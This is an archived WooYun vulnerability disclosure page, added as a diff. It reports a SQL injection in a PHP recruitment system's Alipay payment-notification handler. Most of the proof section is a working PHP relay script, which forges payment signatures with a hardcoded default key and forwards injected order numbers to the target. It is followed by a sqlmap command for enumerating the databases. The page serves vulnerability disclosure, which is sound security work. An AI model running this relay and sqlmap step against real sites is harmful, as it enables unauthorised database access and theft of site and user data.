@@ -1,0 +1,465 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		php云人才系统 UC API 未初始化注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		php云人才系统 UC API 未初始化注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Matt">Matt</a> 
+</li><li>提交时间：		2013-11-21 20:13</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-24：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-11：	细节向普通白帽子公开<br/>
+									2013-12-31：	细节向实习白帽子公开<br/>
+									2014-02-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"></p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">api/alipaydual/notify_url.php<br />
+<br />
+<br />
+<br />
+require_once(&quot;alipay.config.php&quot;);<br />
+<br />
+require_once(&quot;lib/alipay_notify.class.php&quot;);<br />
+<br />
+require_once(dirname(dirname(dirname(__FILE__))).&quot;/data/db.config.php&quot;);<br />
+<br />
+require_once(dirname(dirname(dirname(__FILE__))).&quot;/include/mysql.class.php&quot;);<br />
+<br />
+$db = new mysql($db_config[&#039;dbhost&#039;], $db_config[&#039;dbuser&#039;], $db_config[&#039;dbpass&#039;], $db_config[&#039;dbname&#039;], ALL_PS, $db_config[&#039;charset&#039;]);<br />
+<br />
+//计算得出通知验证结果<br />
+<br />
+$alipayNotify = new AlipayNotify($aliapy_config);<br />
+<br />
+$verify_result = $alipayNotify-&gt;verifyNotify();//有一处验证 验证可以绕过<br />
+<br />
+<br />
+<br />
+if($verify_result) {//验证成功<br />
+<br />
+echo 222;	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////<br />
+<br />
+	//请在这里加上商户的业务逻辑程序代<br />
+<br />
+<br />
+<br />
+	//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——<br />
+<br />
+    //获取支付宝的通知返回参数，可参考技术文档中服务器异步通知参数列表<br />
+<br />
+    $out_trade_no	= $_POST[&#039;out_trade_no&#039;];	    //获取订单号<br />
+<br />
+    $trade_no		= $_POST[&#039;trade_no&#039;];	    	//获取支付宝交易号<br />
+<br />
+    $total			= $_POST[&#039;price&#039;];				//获取总价格<br />
+<br />
+	$sql=$db-&gt;query(&quot;select * from `&quot;.$db_config[&quot;def&quot;].&quot;company_order` where `order_id`=&#039;$out_trade_no&#039;&quot;);//这里进行了注入<br />
+<br />
+	echo &quot;select * from `&quot;.$db_config[&quot;def&quot;].&quot;company_order` where `order_id`=&#039;$out_trade_no&#039;&quot;;<br />
+<br />
+    $row=mysql_fetch_array($sql);<br />
+<br />
+	$sOld_trade_status = $row[&#039;order_state&#039;];<br />
+<br />
+	if($_POST[&#039;trade_status&#039;] == &#039;WAIT_BUYER_PAY&#039;) {<br />
+<br />
+<br />
+<br />
+验证代码：<br />
+<br />
+function verifyNotify(){<br />
+<br />
+		if(empty($_POST)) {//判断POST来的数组是否为空<br />
+<br />
+			return false;<br />
+<br />
+		}<br />
+<br />
+		else {<br />
+<br />
+			//生成签名结果<br />
+<br />
+			$mysign = $this-&gt;getMysign($_POST);//这里会产生一个KEY 我们跟一下<br />
+<br />
+			echo $mysign.&quot;||&quot;;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+	function getMysign($para_temp) {<br />
+<br />
+		//除去待签名参数数组中的空值和签名参数<br />
+<br />
+		$para_filter = paraFilter($para_temp);<br />
+<br />
+		<br />
+<br />
+		//对待签名参数数组排序<br />
+<br />
+		$para_sort = argSort($para_filter);<br />
+<br />
+		<br />
+<br />
+		//生成签名结果<br />
+<br />
+		<br />
+<br />
+		echo trim($this-&gt;aliapy_config[&#039;key&#039;]).&quot;::&quot;. strtoupper(trim($this-&gt;aliapy_config[&#039;sign_type&#039;])).&quot;:x:&quot;;<br />
+<br />
+		$mysign = buildMysign($para_sort, trim($this-&gt;aliapy_config[&#039;key&#039;]), strtoupper(trim($this-&gt;aliapy_config[&#039;sign_type&#039;])));//可以看到这里有利用一个KEY 进行加密 这个KEY是有默认值的 我们可以构造一个中转来生产一个KEY进行注入！<br />
+<br />
+		<br />
+<br />
+		return $mysign;<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">中转程序如下<br />
+<br />
+================================================================================<br />
+<br />
+&lt;?php<br />
+<br />
+function paraFilter($para) {<br />
+<br />
+	$para_filter = array();<br />
+<br />
+	while (list ($key, $val) = each ($para)) {<br />
+<br />
+		if($key == &quot;sign&quot; || $key == &quot;sign_type&quot; || $val == &quot;&quot;)continue;<br />
+<br />
+		else	$para_filter[$key] = $para[$key];<br />
+<br />
+	}<br />
+<br />
+	return $para_filter;<br />
+<br />
+}<br />
+<br />
+function argSort($para) {<br />
+<br />
+	ksort($para);<br />
+<br />
+	reset($para);<br />
+<br />
+	return $para;<br />
+<br />
+}<br />
+<br />
+function createLinkstring($para) {<br />
+<br />
+	$arg  = &quot;&quot;;<br />
+<br />
+	while (list ($key, $val) = each ($para)) {<br />
+<br />
+		$arg.=$key.&quot;=&quot;.$val.&quot;&amp;&quot;;<br />
+<br />
+	}<br />
+<br />
+	//去掉最后一个&amp;字符<br />
+<br />
+	$arg = substr($arg,0,count($arg)-2);<br />
+<br />
+	<br />
+<br />
+	//如果存在转义字符，那么去掉转义<br />
+<br />
+	if(get_magic_quotes_gpc()){$arg = stripslashes($arg);}<br />
+<br />
+	<br />
+<br />
+	return $arg;<br />
+<br />
+}<br />
+<br />
+function sign($prestr,$sign_type=&#039;MD5&#039;) {<br />
+<br />
+	$sign=&#039;&#039;;<br />
+<br />
+	if($sign_type == &#039;MD5&#039;) {<br />
+<br />
+		$sign = md5($prestr);<br />
+<br />
+	}elseif($sign_type ==&#039;DSA&#039;) {<br />
+<br />
+		//DSA 签名方法待后续开发<br />
+<br />
+		die(&quot;DSA 签名方法待后续开发，请先使用MD5签名方式&quot;);<br />
+<br />
+	}else {<br />
+<br />
+		die(&quot;支付宝暂不支持&quot;.$sign_type.&quot;类型的签名方式&quot;);<br />
+<br />
+	}<br />
+<br />
+	return $sign;<br />
+<br />
+}<br />
+<br />
+function buildMysign($sort_para,$key,$sign_type = &quot;MD5&quot;) {<br />
+<br />
+	//把数组所有元素，按照“参数=参数值”的模式用“&amp;”字符拼接成字符串<br />
+<br />
+	$prestr = createLinkstring($sort_para);<br />
+<br />
+	//把拼接后的字符串再与安全校验码直接连接起来<br />
+<br />
+	$prestr = $prestr.$key;<br />
+<br />
+	//把最终的字符串签名，获得签名结果<br />
+<br />
+	$mysgin = sign($prestr,$sign_type);<br />
+<br />
+	return $mysgin;<br />
+<br />
+}<br />
+<br />
+function getMysign($para_temp) {<br />
+<br />
+		//除去待签名参数数组中的空值和签名参数<br />
+<br />
+		$para_filter = paraFilter($para_temp);<br />
+<br />
+		<br />
+<br />
+		//对待签名参数数组排序<br />
+<br />
+		$para_sort = argSort($para_filter);<br />
+<br />
+		<br />
+<br />
+		//生成签名结果<br />
+<br />
+		$mysign = buildMysign($para_sort, &#039;jbjwjnu6zhax0eewc3vfiqldvrg8rnfz&#039;, &#039;MD5&#039;);<br />
+<br />
+		<br />
+<br />
+		return $mysign;<br />
+<br />
+	}<br />
+<br />
+$hash=getMysign($_POST);<br />
+<br />
+$host=&quot;127.0.0.1&quot;;//这里设置下host！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！<br />
+<br />
+$data=&quot;sign={$hash}&amp;out_trade_no={$_POST[out_trade_no]}&quot;;<br />
+<br />
+	$username=rawurlencode(stripslashes($_GET[&#039;username&#039;]));<br />
+<br />
+	$message = &quot;POST /yun/api/alipaydual/notify_url.php HTTP/1.1\r\n&quot;;//这里记得修改路径！！！！！！！！！！！！！！！！！！！！<br />
+<br />
+	$message .= &quot;Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n&quot;;<br />
+<br />
+	$message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;<br />
+<br />
+	$message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij\r\n&quot;;<br />
+<br />
+	$message .= &quot;Host: {$host}\r\n&quot;;<br />
+<br />
+	$message .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;<br />
+<br />
+	$message .= &quot;Connection: close\r\n&quot;;<br />
+<br />
+	$message .= &quot;\r\n&quot;;<br />
+<br />
+	$message .=$data;<br />
+<br />
+	//echo $message;<br />
+<br />
+	//file_put_contents(&#039;2.txt&#039;,$message,FILE_APPEND);<br />
+<br />
+	<br />
+<br />
+//	print $message;<br />
+<br />
+//	exit();<br />
+<br />
+	$ock=fsockopen($host,80);<br />
+<br />
+	if (!$ock) {<br />
+<br />
+		echo &#039;No response from xx!&#039;;<br />
+<br />
+		//die;<br />
+<br />
+		return &#039;&#039;;<br />
+<br />
+	}<br />
+<br />
+	fputs($ock,$message);<br />
+<br />
+	while ($ock &amp;&amp; !feof($ock))<br />
+<br />
+			$resp .= fread($ock, 1024);<br />
+<br />
+<br />
+<br />
+	echo $resp;	<br />
+<br />
+?&gt;<br />
+<br />
+测试方式<br />
+<br />
+sqlmap.py -u &quot;http://127.0.0.1/x.php&quot; --data=&quot;out_trade_no=1&quot; --dbs<br />
+<br />
+就可以了<br />
+<br />
+</p><p class="detail"><a href="../images/21201216df9a9f8d92c8e7274ceb6fde0cff1f21.png" target="_blank"><img src="../images/21201216df9a9f8d92c8e7274ceb6fde0cff1f21.png" alt="QQ截图20131105010306.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Matt" title="Matt">Matt</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043636" title="php云人才系统 UC API 未初始化注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-11-21 20:21</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">我们会及时修复，感谢您的提供！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43636";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
